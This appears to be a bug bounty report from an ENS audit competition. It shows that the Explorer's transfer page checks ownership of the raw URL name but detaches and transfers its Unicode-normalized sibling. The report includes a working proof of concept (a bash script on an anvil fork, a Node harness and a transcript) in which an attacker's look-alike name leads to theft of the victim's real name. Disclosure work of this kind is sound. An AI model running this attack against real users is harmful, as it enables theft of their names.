# 91004 w a critical the explorer transfer flow checks ownership of the name in the url and moves its normalized sibling

**Submitted on Aug 28th 2026 at 19:56:56 UTC by @gzeon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91004
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address
  * Direct theft of user funds

## Description

## Brief/Intro

`/{name}/ownership/transfer` decides *which* name it is acting on twice, from two functions that disagree. The authorization gate reads the raw route parameter; the token id, the resolver detach, the subregistry detach and the ERC-1155 transfer all read `ens_normalize` of it. For any pair of labels that differ only by a character ENSIP-15 folds away, an attacker registers the unnormalized twin of a victim's name, sends that ERC-1155 to the victim's plain EOA, and sends them the link. When the victim opens it and tries to dispose of the unsolicited name, the flow labelled `Transfer name - ｈellopoc.eth` detaches the real `hellopoc.eth`'s resolver and transfers `hellopoc.eth` to the recipient the victim typed. The token id in the calldata is never the name on the screen. The proof of concept below drives the shipped modules against the deployed Sepolia `ETHRegistrar` and `PermissionedRegistry` on a local fork: it shows the substitution, then lets the app's own `detachNameResolver` and `transferToken` execute it.

## Vulnerability Details

The route renders a form once four checks pass. Three read the **raw** route parameter: the name resolves as ENSv2, `is2LD` accepts it, and the connected wallet matches the owner. The fourth, `useCanTransferName`, already reads the normalized one:

```tsx
// apps/portal/src/routes/$name/ownership/transfer.tsx
25   const isSubname = !is2LD(name)
27   const ownerQuery = useQuery(getEnsOwnerQueryOptions({ name }))
104            ({ data, address }) => isAddressEqual(address, data.owner),
196     <SendNameForm name={name} registryAddress={registryAddress} owner={owner} />
```

`getEnsOwner` reaches `resolveEnsOwner`, which normalizes nothing. It splits on `.`, and for a `.eth` 2LD asks the V2 UniversalResolver for the owner and the registry chain of the string it was handed (`apps/portal/src/utils/ens/resolveEnsOwner.ts:81-102`). `is2LD` is `name.split('.').length === 2` (`apps/portal/src/utils/ens/tldHelpers.ts:41`), so a raw 2LD passes the subname block.

The steps that move the asset then read a different name:

```ts
// apps/portal/src/features/transfer/hooks/useTransferName.ts
112        getEnsTokenId({
113          label: getLabel(name),
114          registryAddress,
...
131     const common = { name, walletClient, publicClient: pc, signer, chainId }
132     const label = getLabel(name)
137         detachNameResolver({ ...common, label, registryAddress, id }),
140         detachNameRegistry({ ...common, label, registryAddress, id }),
143         transferToken({ ...common, registryAddress, tokenId, recipient, id }),
177       transactionName: `${STEP_LABELS[step]} - ${name}`,
```

`getLabel` runs `ens_normalize` and then `ens_split`, and returns the first label of the **normalized** name (`apps/portal/src/utils/token/getLabel.ts:10-20`). `getEnsTokenId` hands that label to ensjs, which does `labelhash(label)` verbatim and reads `getTokenId` from the registry (`@ensdomains/ensjs/dist/actions/public/v2/getTokenId.js:21-27`). `detachNameResolver` encodes `setResolver(BigInt(labelhash(label)), 0x0)` on the same registry. `transferToken` encodes `safeTransferFrom(walletClient.account.address, recipient, tokenId, 1, 0x)` (`apps/portal/src/features/transfer/helpers/transferToken.ts:67-71`).

The registry is the same for both names. `resolveEnsOwner` returns `registries[1]`, the registry that contains the leaf label, and for two `.eth` 2LDs that is the one `.eth` `PermissionedRegistry`. So the detach and transfer calls land on a name the victim holds, and nothing reverts.

The split runs through the option list as well. `useTransferDetachTargets` decides which steps to offer by reading the **raw** name (`useNameResolverAddress({ name })` and `getNameRegistriesQueryOptions({ name })`, `:63-64`) while taking its role check from `getLabel(name)` (`:56-60`). "Detach resolver" is therefore offered because the *twin* has a resolver, and detaches the *real name's*. "Detach registry" is offered only when the twin has a non-zero subregistry, which the attacker can arrange at registration and which the proof of concept below does not do. The one step that stays on the raw name throughout is the optional `set-eth-addr`: it reads the resolver of the raw name and builds its forward-resolution request from the same raw string (`apps/portal/src/features/transfer/helpers/setEthAddress.ts:37-44`), so it edits the twin while its neighbours edit the sibling.

The remaining gate confirms rather than blocks. `useCanTransferName` checks `ROLE_CAN_TRANSFER_ADMIN`, but it too derives its label with `getLabel(name)` (`apps/portal/src/features/transfer/hooks/useCanTransferName.ts:57-63`), so it asks whether the victim may transfer the **sibling**, which they may. Its own header comment states what the answer being wrong costs:

```
The transfer flow runs its (irreversible) detach steps *before* the token
`safeTransferFrom`, so a transfer that reverts on this role leaves the name
degraded — resolver/registry detached — and still un-transferred.
```

Here nothing reverts, so the name is degraded **and** transferred.

The Explorer owns the guard that would stop this and applies it on one route. `isValidEnsName` requires `ens_normalize(label) === label` for every label (`apps/portal/src/utils/token/isNormalized.ts:39-57`) and is called from `apps/portal/src/routes/$name/index.tsx:442`. The layout `apps/portal/src/routes/$name.tsx` imports it only to decide a TLD redirect and never gates rendering, so it is not inherited: `/{name}/ownership` and `/{name}/ownership/transfer` both query the raw owner and never call it.

**Delivery.** ENSv2 names are ERC-1155 tokens, and `safeTransferFrom` runs the receiver hook only for contract recipients, so a plain no-code EOA takes the twin without opting in. An EIP-7702-delegated EOA or a smart account may reject it, which narrows the target set rather than closing it. The attacker then sends the victim the `/{twin}/ownership/transfer` link, the ordinary precondition for a web finding.

Once the victim is on the route, no further attacker action is needed. `/{twin}` itself shows "Invalid name", because the index route is the one that checks (`apps/portal/src/routes/$name/index.tsx:442`), but the layout renders `ProfileSidebar` beside that message with its full navigation, and the Ownership page carries a Transfer link built from the same raw parameter, gated on `isConnectedOwner && hasTransferRole && !isSubname` (`apps/portal/src/routes/$name/ownership/index.tsx:100-102,116`), all three of which pass.

**What has to be true.** The victim must hold the normalized sibling's ERC-1155, since that is the token `safeTransferFrom` moves. The twin must resolve as ENSv2 and be exactly a 2LD, and the victim must be connected as its owner. On the sibling they need `ROLE_CAN_TRANSFER_ADMIN` for the transfer and `ROLE_SET_RESOLVER` for the detach step, and the twin must have a resolver for that step to be offered at all (`useTransferDetachTargets.ts:67-95`). The recipient must be a resolved, non-zero address other than the victim, and every resolver, registry, address-record and role query must settle before the button enables (`SendNameForm.tsx:100`). Reaching the route through the sidebar or the Ownership page additionally needs the raw-name availability query to report "not available", which a registered twin satisfies; a direct link does not go through that gate. An owner of a name, holding a twin delivered to a no-code EOA, meets all of it, which is what the proof of concept sets up.

The label class is wide, and the proof of concept measures both halves of the claim: `ens_normalize` folds `ｈellopoc` (U+FF48), `ⓗellopoc` (U+24D7), `𝐡ellopoc` (U+1D421), `ℎellopoc` (U+210E) and a soft-hyphen variant onto `hellopoc`, and after `hellopoc` is registered the registrar still reports all five as available, because `ETHRegistrar.register` hashes the bytes it is given. Registering a name reserves none of the labels that fold onto it, so the construction exists for any target name.

The Explorer will not register such a label through its own UI: `nameValidation.ts:25` rejects anything `isValidEnsName` refuses, with "Names must be normalized (lowercase, valid characters)." The attacker registers through the registrar's ordinary commit and reveal instead, which is what the proof of concept does. That the app applies this check when a name is created and not when one is transferred is the shape of the defect.

## Impact Details

The precise consequence is that the app builds a transaction whose arguments name a different asset from the one on the screen. Two in-scope Critical impacts cover it, each sufficient on its own: **"Malicious interactions with an already-connected wallet"**, specifically *modifying transaction arguments or parameters*, and **"Direct theft of user NFTs"** when the recipient the victim types is the attacker. This is the Explorer rather than the Manager, so the Manager-flow hijack bullet is not the one to read it under.

The victim loses the name they already owned. The plan is a sequence of separate signatures (`apps/portal/src/features/transfer/utils/buildTransferPlan.ts:22-42`), so the damage is staged: the first signature detaches the real name's resolver, and while the victim still holds the token they can reattach it. Completing the run is what makes the loss permanent, because the ERC-1155 is then held by the recipient and recovery depends on that recipient sending it back. A victim who stops partway is left with a name whose registry resolver pointer is zero, so every resolver-backed record on it stops resolving until they notice and set it again; a primary name that depended on those records stops verifying with it.

Cost to the attacker is one ordinary registration plus one transfer. The proof of concept measures `getRegisterPrice` on the deployed registrar at **8000021 USDC units for one year** for an eight-character label; the registration itself is the usual multi-transaction flow of deploying or reusing a resolver, committing, waiting out `MIN_COMMITMENT_AGE`, approving and registering, and delivery is one further `safeTransferFrom`. The attacker picks the target, so they pick a name worth more than that.

This is a testnet deployment, so the loss is a Sepolia name rather than a mainnet one, and the program's severity accordingly rests on the demonstrated user-harm path in the app. Every step of that path is shipped code, and the proof of concept executes the two writes at the end of it with the app's own helpers.

The actions the attack asks of the victim are the ordinary steps of the flow the page exists for. They open the transfer route for a name their wallet holds, type a recipient, start the flow, and approve two transactions. Transferring a name is a first-class Explorer flow with its own route, form and button, and clearing out a name that arrived unasked is a plain reason to use it. What is rendered is a name the victim owns, drawn from the URL, so this is not text injection: the substitution is in the calldata, not in the page.

The screen gives the victim nothing to catch it with. Every string it shows comes from the raw parameter: the sidebar name and the per-step transaction label `Transfer name - ｈellopoc.eth`. The page heading is the constant "Transfer ownership". The form does carry a warning, but it is about the recipient rather than the name: "Transferring ownership of an ENS name is irreversible. Make sure you check the recipient address before proceeding" (`apps/portal/src/features/transfer/components/SendNameForm.tsx:113-118`). The recipient is the one field that is correct.

## References

* `apps/portal/src/routes/$name/ownership/transfer.tsx:25,27,104,196`
* `apps/portal/src/features/transfer/hooks/useTransferName.ts:112-114,131-143,177`
* `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:8-19,57-63`
* `apps/portal/src/features/transfer/helpers/transferToken.ts:67-71`
* `apps/portal/src/features/transfer/helpers/detachNameResolver.ts:65-69`
* `apps/portal/src/features/transfer/helpers/setEthAddress.ts:37`
* `apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts:56-64,67-95`
* `apps/portal/src/features/transfer/utils/buildTransferPlan.ts:22-42`
* `apps/portal/src/features/transfer/components/SendNameForm.tsx:91-96,113-118`
* `apps/portal/src/utils/token/getLabel.ts:10-20`
* `apps/portal/src/utils/ens/resolveEnsOwner.ts:81-102`
* `apps/portal/src/utils/ens/tldHelpers.ts:41`
* `apps/portal/src/utils/token/isNormalized.ts:39-57`
* `apps/portal/src/routes/$name.tsx:22-45`
* `apps/portal/src/routes/$name/index.tsx:442`
* `apps/portal/src/routes/$name/ownership/index.tsx:49-63,100-102,116`
* `apps/portal/src/lib/wagmi.ts:19-28`
* `apps/portal/src/lib/wagmi/helpers.ts:14-17`
* `apps/portal/src/utils/token/nameValidation.ts:25`
* `@ensdomains/ensjs/dist/actions/public/v2/getTokenId.js:21-27`

## Proof of Concept

### Steps to reproduce

{% stepper %}
{% step %}

## Check out the repository

Check out `immunefi-team/audit-comp-ens` at `1c9b47f18fcddd2e864dfe385c4171061c9811ae` and run `pnpm install --frozen-lockfile`.
{% endstep %}

{% step %}

## Install dependencies

Install Foundry (`anvil`, `cast`) and Node 22.
{% endstep %}

{% step %}

## Save the PoC files

Save the two files below, `poc.sh` at the repository root and `poc-crit05.mjs` under `apps/portal/`.
{% endstep %}

{% step %}

## Export a Sepolia RPC URL

Export a Sepolia RPC URL:

```bash
export POC_SEPOLIA_RPC=https://ethereum-sepolia-rpc.publicnode.com
```

The script refuses to start without it and uses no credential from the repository.
{% endstep %}

{% step %}

## Run the PoC

Run `bash poc.sh` from the repository root. It forks Sepolia onto a local anvil on port 8549, aborts rather than reusing anything already on that port, and tears the fork down on exit.
{% endstep %}

{% step %}

## Register the victim name

Block 1: the victim registers an ordinary name, `hellopoc.eth`, through the deployed `ETHRegistrar` at the price that registrar quotes. The registrar is then asked whether the five labels that ENSIP-15 folds onto `hellopoc` are still available, and every one of them is.
{% endstep %}

{% step %}

## Register and transfer the twin

Block 2: the attacker registers `ｈellopoc` (U+FF48 followed by `ellopoc`) as a separate label and `safeTransferFrom`s it to the victim, who now holds it.
{% endstep %}

{% step %}

## Verify the initial state

Block 3: the state before, showing the victim holding `hellopoc.eth` with a resolver set.
{% endstep %}

{% step %}

## Execute the substituted flow

Block 4 is the substitution and the writes. A harness loads the shipped modules through the Explorer's `vitest.config.ts`, which carries the `@` alias vite needs to resolve them, and calls them: `getEnsOwner` on the raw parameter returns the victim, `getLabel` returns `hellopoc`, `getEnsTokenId` on that label returns a different token id from the one in the URL, `ens_normalize` folds all five twin labels onto `hellopoc`, and `buildTransferPlan` plus `STEP_LABELS` produce the step list and the strings the modal renders. Then the app's own `detachNameResolver` and `transferToken` build and send the two transactions, and the transaction manager's own state lines appear as they run.
{% endstep %}

{% step %}

## Verify the final state

Block 5: `hellopoc.eth` now has a zero resolver and is held by the attacker, while the name in the URL never moved.
{% endstep %}
{% endstepper %}

### On the competition rules

This is a Websites and Applications program, so the Web2 PoC guidelines apply and "a command line or any programmable runnable code PoC is acceptable"; the program tag is `poc: step_by_step`, which the numbered list above satisfies. The run touches no public state: anvil forks Sepolia into a local chain, every transaction is mined there, and nothing is broadcast to a public testnet or mainnet. No third-party system or smart contract is tested, no traffic is generated against any project asset, no social engineering is performed against any real person, and no credential from the repository is exercised against a provider, which is why `POC_SEPOLIA_RPC` is required rather than defaulted. The PoC is complete rather than partial: it runs to the final on-chain state in one command, against in-scope source that is not modified, with the two harness files added alongside it.

Two substitutions point the shipped code at the fork, and both are the app's own seams. The reads go through `wagmiConfig` and pick up `VITE_SEPOLIA_RPC_URL`, the override `apps/portal/src/lib/wagmi.ts:19-28` documents; the writes use a wallet client built on `sepoliaWithEns` with its `rpcUrls.default.http` replaced by the fork. Chain id, contract addresses and every module under test are untouched.

Two fork conveniences appear in the registration helper, and neither is a capability the attack needs. `anvil_setCode <acct> 0x` clears the stray EIP-7702 delegation anvil's default keys carry on Sepolia, which otherwise makes the ERC-1155 receiver hook revert; a real target is an ordinary no-code EOA. `MockUSDC.mint` stands in for the faucet a live buyer would use. One line of expected noise is in the transcript: `[WARN] IndexedDB unavailable` is the real transaction-manager persistence layer falling back to memory outside a browser, and the script drops its stack frames for readability.

`poc.sh`:

```bash
#!/usr/bin/env bash
# CRIT-05 — the Explorer transfer page authorizes the URL name and moves its
# normalized sibling. Run from the repository root of
# immunefi-team/audit-comp-ens at 1c9b47f18fcddd2e864dfe385c4171061c9811ae.
#
#   POC_SEPOLIA_RPC=<any sepolia rpc> bash poc.sh
#
# Optional: POC_FORK_BLOCK=<n> pins the fork so the chain state is fixed. It
# needs an archive RPC — public Sepolia endpoints prune state within about a
# hundred blocks, so the default is to fork at head and print the block used.
#
# Needs: foundry (anvil, cast), node 22, `pnpm install --frozen-lockfile`.
set -euo pipefail

: "${POC_SEPOLIA_RPC:?set POC_SEPOLIA_RPC to a Sepolia RPC URL (e.g. https://ethereum-sepolia-rpc.publicnode.com)}"
PORT=8549
R=http://127.0.0.1:$PORT

# ENSv2 Sepolia deployment, read out of the app's own dependency
# (@ensdomains/ensjs `ensL1Contracts[sepolia]`).
REGISTRAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc   # ETHRegistrar
ETHREG=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2      # .eth PermissionedRegistry
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39        # MockUSDC
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef     # VerifiableFactory
IMPL=0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e        # PermissionedResolver impl
ZERO=0x0000000000000000000000000000000000000000
ZERO32=0x0000000000000000000000000000000000000000000000000000000000000000
ROLES_ALL=0x1111111111111111111111111111111111111111111111111111111111111111

VICTIM=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
VICTIM_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
ATTACKER=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
ATTACKER_KEY=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a

VICTIM_LABEL=hellopoc
TWIN_LABEL=$(printf '\xef\xbd\x88ellopoc')   # U+FF48 FULLWIDTH LATIN SMALL LETTER H + "ellopoc"
TWIN_NAME="${TWIN_LABEL}.eth"

# Fail fast rather than silently reusing somebody else's chain on this port.
if cast block-number --rpc-url $R >/dev/null 2>&1; then
  echo "ABORT: something is already listening on $PORT. Stop it and re-run."; exit 1
fi

anvil --fork-url "$POC_SEPOLIA_RPC" ${POC_FORK_BLOCK:+--fork-block-number $POC_FORK_BLOCK} \
  --port $PORT --silent >/tmp/poc-crit05-anvil.log 2>&1 &
ANVIL_PID=$!
trap 'kill $ANVIL_PID 2>/dev/null || true' EXIT
for _ in $(seq 1 40); do cast block-number --rpc-url $R >/dev/null 2>&1 && break; sleep 2; done
cast block-number --rpc-url $R >/dev/null 2>&1 || { echo "ABORT: anvil did not come up"; exit 1; }

# One ordinary registration through the deployed ETHRegistrar. Two fork
# conveniences, neither of which the attack needs: anvil's default keys carry a
# stray EIP-7702 delegation on Sepolia that makes the ERC-1155 receiver hook
# revert, and MockUSDC has a public `mint` where a live buyer would use the faucet.
register_name () {  # $1 label  $2 addr  $3 key  $4 salt
  local LABEL="$1" ACCT="$2" KEY="$3" SALT="$4" INIT RESOLVER SECRET COMMIT
  cast rpc anvil_setCode "$ACCT" 0x --rpc-url $R >/dev/null
  cast send $USDC "mint(address,uint256)" "$ACCT" 1000000000 --private-key "$KEY" --rpc-url $R >/dev/null
  INIT=$(cast calldata "initialize(address,uint256,bytes[])" "$ACCT" $ROLES_ALL "[]")
  RESOLVER=$(cast call $FACTORY "deployProxy(address,uint256,bytes)(address)" $IMPL "$SALT" "$INIT" --from "$ACCT" --rpc-url $R)
  cast send $FACTORY "deployProxy(address,uint256,bytes)(address)" $IMPL "$SALT" "$INIT" --private-key "$KEY" --rpc-url $R >/dev/null
  SECRET=0x$(printf '%064x' "$SALT")
  COMMIT=$(cast call $REGISTRAR "makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)" "$LABEL" "$ACCT" "$SECRET" $ZERO "$RESOLVER" 31536000 $ZERO32 --rpc-url $R)
  cast send $REGISTRAR "commit(bytes32)" "$COMMIT" --private-key "$KEY" --rpc-url $R >/dev/null
  cast rpc evm_increaseTime 120 --rpc-url $R >/dev/null; cast rpc evm_mine --rpc-url $R >/dev/null
  cast send $USDC "approve(address,uint256)" $REGISTRAR 1000000000 --private-key "$KEY" --rpc-url $R >/dev/null
  cast send $REGISTRAR "register(string,address,bytes32,address,address,uint64,address,bytes32)" "$LABEL" "$ACCT" "$SECRET" $ZERO "$RESOLVER" 31536000 $USDC $ZERO32 --private-key "$KEY" --rpc-url $R >/dev/null
  echo "$RESOLVER"
}

tokid () { cast call $ETHREG 'getTokenId(uint256)(uint256)' "$(cast to-dec "$(cast keccak "$1")")" --rpc-url $R | awk '{print $1}'; }
bal ()   { cast call $ETHREG 'balanceOf(address,uint256)(uint256)' "$1" "$2" --rpc-url $R; }

echo "### 1. the victim owns an ordinary name"
echo "  forked at block             $(cast block-number --rpc-url $R)${POC_FORK_BLOCK:+ (pinned)}"
echo "  register price, 1 year      $(cast call $REGISTRAR 'getRegisterPrice(string,uint64,address)(uint256,uint256)' "$VICTIM_LABEL" 31536000 $USDC --rpc-url $R | head -1) USDC units"
V_RESOLVER=$(register_name "$VICTIM_LABEL" "$VICTIM" "$VICTIM_KEY" 111111)
V_TOKEN=$(tokid "$VICTIM_LABEL")
echo "  ${VICTIM_LABEL}.eth owner          $VICTIM"
echo "  ${VICTIM_LABEL}.eth resolver       $V_RESOLVER"
echo "  isAvailable(\"${VICTIM_LABEL}\") is now $(cast call $REGISTRAR 'isAvailable(string)(bool)' "$VICTIM_LABEL" --rpc-url $R), and every label that ENSIP-15 folds onto it is still free:"
for L in "$(printf '\xef\xbd\x88ellopoc')" "$(printf '\xe2\x93\x97ellopoc')" "$(printf '\xf0\x9d\x90\xa1ellopoc')" "$(printf '\xe2\x84\x8eellopoc')" "$(printf 'h\xc2\xadellopoc')"; do
  printf '    isAvailable(%s) = %s\n' "$L" "$(cast call $REGISTRAR 'isAvailable(string)(bool)' "$L" --rpc-url $R)"
done
echo

echo "### 2. the attacker registers the twin label and pushes it to the victim"
A_RESOLVER=$(register_name "$TWIN_LABEL" "$ATTACKER" "$ATTACKER_KEY" 222222)
T_TOKEN=$(tokid "$TWIN_LABEL")
cast send $ETHREG 'safeTransferFrom(address,address,uint256,uint256,bytes)' $ATTACKER $VICTIM "$T_TOKEN" 1 0x --private-key $ATTACKER_KEY --rpc-url $R >/dev/null
echo "  ${TWIN_NAME} registered by attacker, then transferred to the victim"
echo "  a plain no-code EOA takes it without opting in; the victim now holds it: $(bal $VICTIM "$T_TOKEN")"
echo

echo "### 3. before"
echo "  ${VICTIM_LABEL}.eth resolver       $(cast call $ETHREG 'getResolver(string)(address)' "$VICTIM_LABEL" --rpc-url $R)"
echo "  ${VICTIM_LABEL}.eth victim holds   $(bal $VICTIM "$V_TOKEN")"
echo "  ${VICTIM_LABEL}.eth attacker holds $(bal $ATTACKER "$V_TOKEN")"
echo

# The victim opens /<twin>/ownership/transfer, leaves the default options, types
# the attacker's address as the recipient, and runs the flow. Everything below
# this line calls shipped Explorer code: the reads, the plan, and the two
# helpers that build and send the transactions. The route and form are not
# mounted; see the header of poc-crit05.mjs for what the harness supplies. `[WARN] IndexedDB unavailable`
# is the real transaction-manager persistence layer falling back to memory
# outside a browser; the `at ...` stack frames are dropped for readability.
echo "### 4. the victim runs the flow on /${TWIN_NAME}/ownership/transfer"
POC_RAW_NAME="$TWIN_NAME" \
POC_FORK_RPC=$R \
POC_VICTIM_KEY=$VICTIM_KEY \
POC_RECIPIENT=$ATTACKER \
VITE_SEPOLIA_RPC_URL=$R \
node apps/portal/poc-crit05.mjs 2>&1 | grep -v '^    at '
echo

echo "### 5. after"
echo "  ${VICTIM_LABEL}.eth resolver       $(cast call $ETHREG 'getResolver(string)(address)' "$VICTIM_LABEL" --rpc-url $R)"
echo "  ${VICTIM_LABEL}.eth victim holds   $(bal $VICTIM "$V_TOKEN")"
echo "  ${VICTIM_LABEL}.eth attacker holds $(bal $ATTACKER "$V_TOKEN")"
echo "  ${TWIN_NAME} resolver   $(cast call $ETHREG 'getResolver(string)(address)' "$TWIN_LABEL" --rpc-url $R)"
echo "  ${TWIN_NAME} victim holds $(bal $VICTIM "$T_TOKEN")   <- the name in the URL never moved"
```

`apps/portal/poc-crit05.mjs`:

```js
// A harness. It loads shipped Portal modules through the Explorer's
// vitest.config.ts (for the `@/` alias) and calls them. The reads, the plan and
// the two transactions are the app's; the inputs, clients, signer, recipient,
// transfer options and the printed annotations are this file's. It does not
// mount the route, SendNameForm, useTransferName or the transaction modal.
import { createServer } from 'vite'
import { createPublicClient, createWalletClient, http } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'

const here = import.meta.dirname // apps/portal
const server = await createServer({
  root: here,
  configFile: `${here}/vitest.config.ts`,
  server: { middlewareMode: true },
  appType: 'custom',
  logLevel: 'silent',
})

const RAW = process.env.POC_RAW_NAME
const RPC = process.env.POC_FORK_RPC
const VICTIM_KEY = process.env.POC_VICTIM_KEY
const RECIPIENT = process.env.POC_RECIPIENT

const m = async (p) => server.ssrLoadModule(p)
const ownerMod = await m('/src/features/profile/hooks/useEnsOwner.ts')
const labelMod = await m('/src/utils/token/getLabel.ts')
const tldMod = await m('/src/utils/ens/tldHelpers.ts')
const tokenMod = await m('/src/features/profile/hooks/useTokenId.ts')
const normMod = await m('/src/utils/token/isNormalized.ts')
const { ens_normalize } = await import('@adraffy/ens-normalize')
const planMod = await m('/src/features/transfer/utils/buildTransferPlan.ts')
const signerMod = await m('/src/features/registry/utils/signer.helpers.ts')
const detachMod = await m('/src/features/transfer/helpers/detachNameResolver.ts')
const transferMod = await m('/src/features/transfer/helpers/transferToken.ts')
const wagmiMod = await m('/src/lib/wagmi.ts')

const unwrap = (r) => r.match((v) => v, (e) => { throw e })

// --- the split, read out of the shipped modules -------------------------
const owner = await unwrap(await ownerMod.getEnsOwner({ name: RAW }))
const label = labelMod.getLabel(RAW)
const tokenId = await unwrap(await tokenMod.getEnsTokenId({ label, registryAddress: owner.registryAddress }))
const urlTokenId = await unwrap(await tokenMod.getEnsTokenId({ label: RAW.split('.')[0], registryAddress: owner.registryAddress }))

console.log('  route parameter                       ', JSON.stringify(RAW))
console.log('  isValidEnsName(route parameter)       ', normMod.isValidEnsName(RAW), '  <- the guard exists, but only /$name/index calls it')
console.log('  is2LD(route parameter)                ', tldMod.is2LD(RAW), '   <- the subname block does not fire')
console.log('  -- the page gate reads the RAW name --')
console.log('  getEnsOwner(raw).owner                ', owner.owner, '  <- the connected victim, so the route\'s owner check passes')
console.log('  getEnsOwner(raw).registryAddress      ', owner.registryAddress)
console.log('  -- the calldata reads the NORMALIZED name --')
console.log('  getLabel(raw)                         ', JSON.stringify(label), '      <- ens_normalize + ens_split')
console.log('  getEnsTokenId({label: getLabel(raw)}) ', tokenId.toString())
console.log('  token id of the name in the URL       ', urlTokenId.toString())
console.log('  the flow will move                    ', tokenId === urlTokenId ? 'the name in the URL' : 'a DIFFERENT name')

// --- the label class, normalized by the same library getLabel uses ------
const TWINS = ['\uFF48ellopoc', '\u24D7ellopoc', '\u{1D421}ellopoc', '\u210Eellopoc', 'h\u00ADellopoc']
console.log('  ens_normalize of each twin label      ', JSON.stringify(TWINS.map((t) => ens_normalize(t))))

// --- the plan the shipped builder produces for the visible options ------
// The options SendNameForm would end up with here: the twin has a resolver and
// no subregistry, so only "Detach resolver" is visible (useTransferDetachTargets
// :83-95). Set directly rather than discovered, because the form is not mounted.
const options = { setEthAddress: false, detachResolver: true, detachRegistry: false }
const steps = planMod.buildTransferPlan(options)
console.log('  buildTransferPlan(...)                ', JSON.stringify(steps))
console.log('  modal labels these steps              ', JSON.stringify(steps.map((s) => `${planMod.STEP_LABELS[s]} - ${RAW}`)))

// --- the shipped helpers execute the writes -----------------------------
const chain = { ...wagmiMod.sepoliaWithEns, rpcUrls: { default: { http: [RPC] } } }
const account = privateKeyToAccount(VICTIM_KEY)
const publicClient = createPublicClient({ chain, transport: http(RPC) })
const walletClient = createWalletClient({ account, chain, transport: http(RPC) })
const signer = signerMod.createEOASigner(walletClient)
const common = { name: RAW, walletClient, publicClient, signer, chainId: chain.id }

const r1 = await detachMod.detachNameResolver({ ...common, label, registryAddress: owner.registryAddress, id: 'transfer-detach-resolver' })
console.log('  detachNameResolver() tx               ', r1.hash)
const r2 = await transferMod.transferToken({ ...common, registryAddress: owner.registryAddress, tokenId, recipient: RECIPIENT, id: 'transfer-transfer-token' })
console.log('  transferToken() tx                    ', r2.hash)

await server.close()
process.exit(0)
```

### Transcript

Set `POC_FORK_BLOCK` against an archive RPC for a deterministic run. Without one the fork follows head, because the public endpoint above kept only about the last hundred blocks of state when measured, so the block number, the transaction hashes and anything depending on live chain state can differ between runs.

```
### 1. the victim owns an ordinary name
  forked at block             11586255
  register price, 1 year      8000021 [8e6] USDC units
  hellopoc.eth owner          0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  hellopoc.eth resolver       0x88D9a430421BeD369265c0826cCD42778e56F244
  isAvailable("hellopoc") is now false, and every label that ENSIP-15 folds onto it is still free:
    isAvailable(ｈellopoc) = true
    isAvailable(ⓗellopoc) = true
    isAvailable(𝐡ellopoc) = true
    isAvailable(ℎellopoc) = true
    isAvailable(h­ellopoc) = true

### 2. the attacker registers the twin label and pushes it to the victim
  ｈellopoc.eth registered by attacker, then transferred to the victim
  a plain no-code EOA takes it without opting in; the victim now holds it: 1

### 3. before
  hellopoc.eth resolver       0x88D9a430421BeD369265c0826cCD42778e56F244
  hellopoc.eth victim holds   1
  hellopoc.eth attacker holds 0

### 4. the victim runs the flow on /ｈellopoc.eth/ownership/transfer
  route parameter                        "ｈellopoc.eth"
  isValidEnsName(route parameter)        false   <- the guard exists, but only /$name/index calls it
  is2LD(route parameter)                 true    <- the subname block does not fire
  -- the page gate reads the RAW name --
  getEnsOwner(raw).owner                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8   <- the connected victim, so the route's owner check passes
  getEnsOwner(raw).registryAddress       0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
  -- the calldata reads the NORMALIZED name --
  getLabel(raw)                          "hellopoc"       <- ens_normalize + ens_split
  getEnsTokenId({label: getLabel(raw)})  17879207323508683684850749378060517423384752132353734075400513681458890539008
  token id of the name in the URL        71239438700316900372289560416802552304906963827341864443529531153183963873280
  the flow will move                     a DIFFERENT name
  ens_normalize of each twin label       ["hellopoc","hellopoc","hellopoc","hellopoc","hellopoc"]
  buildTransferPlan(...)                 ["detach-resolver","transfer-token"]
  modal labels these steps               ["Detach resolver - ｈellopoc.eth","Transfer name - ｈellopoc.eth"]
📊 [TRANSACTION MANAGER] Transaction transfer-detach-resolver state: pending
[WARN] IndexedDB unavailable ReferenceError: indexedDB is not defined
[WARN] Using in-memory transaction storage (data will not persist)
📊 [TRANSACTION MANAGER] Transaction transfer-detach-resolver state: success
  detachNameResolver() tx                0x9a596a4dbc928b7d948ff1ec3714527226a317ebfc62452c9d7b2ef7df294d5d
📊 [TRANSACTION MANAGER] Transaction transfer-transfer-token state: submitting
📊 [TRANSACTION MANAGER] Transaction transfer-transfer-token state: pending
📊 [TRANSACTION MANAGER] Transaction transfer-transfer-token state: success
  transferToken() tx                     0x95c460eeb8f8c62369f5f421a141a1b328f9d43871471912baabcb32a7e2efed

### 5. after
  hellopoc.eth resolver       0x0000000000000000000000000000000000000000
  hellopoc.eth victim holds   0
  hellopoc.eth attacker holds 1
  ｈellopoc.eth resolver   0x0938f6470E1865D78dE492C6A365A98E3971978d
  ｈellopoc.eth victim holds 1   <- the name in the URL never moved
```
